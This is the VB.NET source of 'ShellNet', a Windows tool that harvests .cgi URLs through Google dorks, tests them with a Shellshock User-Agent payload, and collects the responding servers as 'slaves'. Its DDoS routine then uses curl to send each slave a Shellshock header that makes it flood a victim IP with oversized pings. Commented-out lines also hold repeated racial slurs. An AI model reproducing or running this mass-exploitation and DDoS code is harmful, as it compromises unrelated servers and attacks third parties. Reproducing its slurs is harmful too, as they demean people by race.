Imports System
Imports System.Drawing
Imports System.Net
Imports System.Windows.Forms
Public Class Form1
    Dim dct As Dictionary(Of WebBrowser, DateTime) = New Dictionary(Of WebBrowser, Date)()
    Private isMouseDown As Boolean = False
    Private mouseOffset As Point
    Dim shellshocktest As String = "() { :;}; echo zapre is everywhere' bash -c 'echo hello'"
    Dim isready As Boolean = False
    Public isGET As Boolean = False
    Public isPOST As Boolean = False
    Private flg As Boolean
    Private Count As Long
    Private psi As ProcessStartInfo
    Private cmd As Process
    Private Delegate Sub InvokeWithString(ByVal text As String)
    ' Left mouse button pressed
    Private Sub Form1_MouseDown(sender As Object, e As MouseEventArgs) Handles Me.MouseDown
        If e.Button = Windows.Forms.MouseButtons.Left Then
            ' Get the new position
            mouseOffset = New Point(-e.X, -e.Y)
            ' Set that left button is pressed
            isMouseDown = True
        End If
    End Sub

    ' MouseMove used to check if mouse cursor is moving
    Private Sub Form1_MouseMove(sender As Object, e As MouseEventArgs) Handles Me.MouseMove
        If isMouseDown Then
            Dim mousePos As Point = Control.MousePosition
            ' Get the new form position
            mousePos.Offset(mouseOffset.X, mouseOffset.Y)
            Me.Location = mousePos
        End If
    End Sub

    ' Left mouse button released, form should stop moving
    Private Sub Form1_MouseUp(sender As Object, e As MouseEventArgs) Handles Me.MouseUp
        If e.Button = Windows.Forms.MouseButtons.Left Then
            isMouseDown = False
        End If
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
        Panel1.BackColor = Color.FromArgb(200, 100, 100, 100)
    End Sub

    Private Sub BonfireButton1_Click(sender As Object, e As EventArgs) Handles BonfireButton1.Click
        Try
            linkGetter.Navigate("https://www.google.com/search?num=350&q=" + txtDork.Text)
        Catch ex As Exception
            MsgBox("Critical Error, please restart ShellNet!: " + ex.Message)
            Application.Exit()
        End Try
    End Sub

    Private Sub BonfireButton2_Click(sender As Object, e As EventArgs) Handles BonfireButton2.Click
        Try
            lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
            Dim newestURL As String = lstreadytoscan.SelectedItem.ToString()
            timeoutchecker.Start()
            webExploiter.Navigate(newestURL)
        Catch ex As Exception
            lstConsole.Items.Add("Exploiter: Trying " + lstreadytoscan.SelectedItem.ToString())
        End Try
    End Sub

    Function shelltester2()
        Try
            If lstreadytoscan.Items.Count > 0 Then
                alertSCAN.Visible = True
                For Each item In lstVulnServers.Items
                    lstSlaves.Items.Add(item)
                Next
            Else
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                Dim request = CType(WebRequest.Create(lstreadytoscan.SelectedItem.ToString()), HttpWebRequest)
                request.Method = "GET"
                request.ContentType = "application/x-www-form-urlencoded"
                request.UserAgent = shellshocktest
                Dim response = CType(request.GetResponse(), HttpWebResponse)
                'MessageBox.Show(response.StatusCode.ToString(), "Response")
                If response.StatusCode.ToString() = "OK" Then
                    lstVulnServers.Items.Add(lstreadytoscan.SelectedItem.ToString())
                    lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                    lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                    shelltester()
                ElseIf response.StatusCode.ToString() = "Gone" Then
                    lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                    lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                    shelltester()
                    'My.Computer.Clipboard.SetText(response.StatusCode.ToString())
                ElseIf response.StatusCode.ToString() Is Nothing Then
                    lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                    lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                    shelltester()
                ElseIf response.StatusCode.ToString() = "Error" Then
                    lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                    lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                    shelltester()
                ElseIf response.StatusCode.ToString() = "Not Found" Then
                    lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                    lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                    shelltester()
                ElseIf response.StatusCode.ToString() = "File or Directory Not Found" Then
                    lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                    lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                    shelltester()
                End If
            End If
        Catch ex As Exception
            lstConsole.Items.Add("Error: " + ex.Message)
        End Try
    End Function

    Function shelltester()
        Try
            If lstreadytoscan.Items.Count > 0 Then
                alertSCAN.Visible = True
                For Each item In lstVulnServers.Items
                    lstSlaves.Items.Add(item)
                Next
            Else
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                Dim request = CType(WebRequest.Create(lstreadytoscan.SelectedItem.ToString()), HttpWebRequest)
                request.Method = "GET"
                request.ContentType = "application/x-www-form-urlencoded"
                request.UserAgent = shellshocktest
                Dim response = CType(request.GetResponse(), HttpWebResponse)
                'MessageBox.Show(response.StatusCode.ToString(), "Response")
                If response.StatusCode.ToString() = "OK" Then
                    lstVulnServers.Items.Add(lstreadytoscan.SelectedItem.ToString())
                    lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                    lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                    shelltester2()
                ElseIf response.StatusCode.ToString() = "Gone" Then
                    lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                    lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                    shelltester2()
                    'My.Computer.Clipboard.SetText(response.StatusCode.ToString())
                ElseIf response.StatusCode.ToString() Is Nothing Then
                    lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                    lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                    shelltester2()
                ElseIf response.StatusCode.ToString() = "Error" Then
                    lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                    lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                    shelltester2()
                ElseIf response.StatusCode.ToString() = "Not Found" Then
                    lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                    lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                    shelltester2()
                ElseIf response.StatusCode.ToString() = "File or Directory Not Found" Then
                    lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                    lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                    shelltester2()
                End If
            End If
        Catch ex As Exception
            lstConsole.Items.Add("Error: " + ex.Message)
        End Try
    End Function

    Function removegoogle()
        Try
            For i As Integer = lstServersFound.Items.Count - 1 To 0 Step -1
                If lstServersFound.Items(i).Contains("google.com") Then
                    lstServersFound.Items.RemoveAt(i)
                End If
            Next
        Catch ex As Exception

        End Try
    End Function

    Function removeyoutube()
        Try
            For i As Integer = lstServersFound.Items.Count - 1 To 0 Step -1
                If lstServersFound.Items(i).Contains("youtube.com") Then
                    lstServersFound.Items.RemoveAt(i)
                End If
            Next
        Catch ex As Exception

        End Try
    End Function

    Function removecache()
        Try
            For i As Integer = lstServersFound.Items.Count - 1 To 0 Step -1
                If lstServersFound.Items(i).Contains("webcache.googleusercontent.com") Then
                    lstServersFound.Items.RemoveAt(i)
                End If
            Next
        Catch ex As Exception

        End Try
    End Function

    Function removeallnotcgi()
        Try
            For i As Integer = lstServersFound.Items.Count - 1 To 0 Step -1
                If Not lstServersFound.Items(i).Contains(".cgi") Then
                    lstServersFound.Items.RemoveAt(i)
                End If
            Next
        Catch ex As Exception

        End Try
    End Function

    Private Sub linkGetter_DocumentCompleted(sender As Object, e As WebBrowserDocumentCompletedEventArgs) Handles linkGetter.DocumentCompleted
        Try
            For Each ClientControl As HtmlElement In linkGetter.Document.Links
                lstServersFound.Items.Add(ClientControl.GetAttribute("href"))
            Next
            removegoogle()
            removecache()
            removeyoutube()
            linkGetter.Stop()
            isready = True
            lstServersFound.SelectedItem = lstServersFound.Items.Item(0) 'remove shitty result
            lstServersFound.Items.Remove(lstServersFound.SelectedItem)
        Catch ex As Exception
            isready = False
            MsgBox("Error: " + ex.Message)
        End Try
    End Sub

    Private Sub BonfireButton3_Click(sender As Object, e As EventArgs) Handles BonfireButton3.Click
        Try
            For Each item In lstServersFound.Items
                lstreadytoscan.Items.Add(item)
            Next
            isready = True
            Panel1.Visible = False
            txtImport.Visible = False
            BonfireButton2.Enabled = True
            ChangeUserAgent(shellshocktest)
            txtLEFT2SCAN.Text = lstreadytoscan.Items.Count.ToString()
        Catch ex As Exception

        End Try
    End Sub

    Private Sub BonfireButton4_Click(sender As Object, e As EventArgs) Handles BonfireButton4.Click
        Try
            Dim result As DialogResult = MessageBox.Show("By submitting an answer you understand that you must have prior mutual consent to perform a 'DDoS' attack on the target server(s). You're responsible for your own actions, the creator of ShellNet (Zapre) is not responsible for anything you cause. Using ShellNet for malicious purposes can get you in serious trouble.                                                                                         DO YOU UNDERSTAND?", "ShellNet - DDoS", MessageBoxButtons.YesNoCancel, MessageBoxIcon.Exclamation)
            If result = DialogResult.Cancel Then
                'nothing
            ElseIf result = DialogResult.No Then
                Application.Exit()
            ElseIf result = DialogResult.Yes Then
                DDoSer.Start()
            End If
        Catch ex As Exception
            lstConsole.Items.Add("DDoS: " + ex.Message)
        End Try
    End Sub

    Private Sub Async_Data_Received(ByVal sender As Object, ByVal e As DataReceivedEventArgs)
        Me.Invoke(New InvokeWithString(AddressOf Sync_Output), e.Data)
    End Sub

    Private Sub Sync_Output(ByVal text As String)
        cmdOutput.TextBox1.AppendText(text & Environment.NewLine)
        cmdOutput.TextBox1.ScrollToCaret()
    End Sub

    Private Sub trckPower_Scroll(sender As Object, e As EventArgs) Handles trckPower.Scroll
        txtPowerValue.Text = trckPower.Value.ToString()
    End Sub

    Private Sub webExploiter_DocumentCompleted(sender As Object, e As WebBrowserDocumentCompletedEventArgs) Handles webExploiter.DocumentCompleted
        flg = True
        Try
            If lstreadytoscan.Items.Count < 0 Then
                alertSCAN.Visible = True
                For Each item In lstVulnServers.Items
                    lstSlaves.Items.Add(item)
                    ListBox1.Items.Add(item)
                Next
            End If
            Dim exploitResult As String = webExploiter.DocumentText.ToString()
            If InStr(exploitResult, "OK") Then
                'MsgBox("nigger add")
                lstVulnServers.Items.Add(lstreadytoscan.SelectedItem.ToString())
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                exploitResult = ""
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                webExploiter.Navigate(lstreadytoscan.SelectedItem.ToString())
                txtVULNSERV.Text = txtVULNSERV.Text + 1
                txtLEFT2SCAN.Text = txtLEFT2SCAN.Text - 1
            ElseIf InStr(exploitResult, "Gone") Then
                'MsgBox("nigger fuck Gone")
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                exploitResult = ""
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                webExploiter.Navigate(lstreadytoscan.SelectedItem.ToString())
                txtLEFT2SCAN.Text = txtLEFT2SCAN.Text - 1
            ElseIf exploitResult Is Nothing Then
                'MsgBox("nigger fuck Nothing")
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                My.Computer.Clipboard.SetText(exploitResult)
                exploitResult = ""
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                webExploiter.Navigate(lstreadytoscan.SelectedItem.ToString())
                txtLEFT2SCAN.Text = txtLEFT2SCAN.Text - 1
            ElseIf InStr(exploitResult, "Error") Then
                'MsgBox("nigger fuck Error")
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                exploitResult = ""
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                webExploiter.Navigate(lstreadytoscan.SelectedItem.ToString())
                txtLEFT2SCAN.Text = txtLEFT2SCAN.Text - 1
            ElseIf InStr(exploitResult, "Not Found") Then
                ' MsgBox("nigger fuck Not Found")
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                exploitResult = ""
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                webExploiter.Navigate(lstreadytoscan.SelectedItem.ToString())
                txtLEFT2SCAN.Text = txtLEFT2SCAN.Text - 1
            ElseIf InStr(exploitResult, "File or Directory Not Found") Then
                'MsgBox("nigger fuck file olr d")
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                exploitResult = ""
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                webExploiter.Navigate(lstreadytoscan.SelectedItem.ToString())
                txtLEFT2SCAN.Text = txtLEFT2SCAN.Text - 1
            ElseIf webExploiter.DocumentTitle = "HTTP 404 Not Found" Then
                'MsgBox("nigger fuck 404")
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                exploitResult = ""
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                webExploiter.Navigate(lstreadytoscan.SelectedItem.ToString())
                txtLEFT2SCAN.Text = txtLEFT2SCAN.Text - 1
            ElseIf webExploiter.DocumentTitle = "500 Internal Server Error" Then
                lstVulnServers.Items.Add(lstreadytoscan.SelectedItem.ToString())
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                exploitResult = ""
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                webExploiter.Navigate(lstreadytoscan.SelectedItem.ToString())
                txtLEFT2SCAN.Text = txtLEFT2SCAN.Text - 1
            Else
                'MsgBox("nigger add bottom")
                lstVulnServers.Items.Add(lstreadytoscan.SelectedItem.ToString())
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
                exploitResult = ""
                lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
                webExploiter.Navigate(lstreadytoscan.SelectedItem.ToString())
                txtVULNSERV.Text = txtVULNSERV.Text + 1
                txtLEFT2SCAN.Text = txtLEFT2SCAN.Text - 1
            End If
            If txtLEFT2SCAN.Text = "1" Then
                txtLEFT2SCAN.Text = "0"
                alertSCAN.Visible = True
                For Each item In lstVulnServers.Items
                    lstSlaves.Items.Add(item)
                    ListBox1.Items.Add(item)
                Next
            End If
        Catch ex As Exception
            lstConsole.Items.Add("Exploiter: " + ex.Message)
        End Try
    End Sub

    Private Sub timeoutchecker_Tick(sender As Object, e As EventArgs) Handles timeoutchecker.Tick
        Count = Count + 1
        If Count = 60 And flg = False Then
            MsgBox("timeout")
            lstVulnServers.Items.Add(lstreadytoscan.SelectedItem.ToString())
            lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
            lstreadytoscan.Items.Remove(lstreadytoscan.SelectedItem)
            lstreadytoscan.SelectedItem = lstreadytoscan.Items.Item(0)
            webExploiter.Navigate(lstreadytoscan.SelectedItem.ToString())
        End If
    End Sub

    Private Sub webExploiter_ProgressChanged(sender As Object, e As WebBrowserProgressChangedEventArgs)

    End Sub

    Private Sub DDoSer_Tick(sender As Object, e As EventArgs) Handles DDoSer.Tick
        Try
            ListBox1.SelectedItem = ListBox1.Items.Item(0)
            Shell("cmd.exe /c curl " + ListBox1.SelectedItem.ToString() + " -v -H " + quote.Text + "UserAgent: () { :; }; ping -s 100000 " + txtVictimIP.Text + quote.Text)
            ListBox1.Items.Remove(ListBox1.SelectedItem())
            ListBox1.SelectedItem = ListBox1.Items.Item(0)
        Catch ex As Exception
            DDoSer.Stop()
            MsgBox("Finished sending payload to slaves.", MsgBoxStyle.Information)
        End Try
    End Sub
End Class
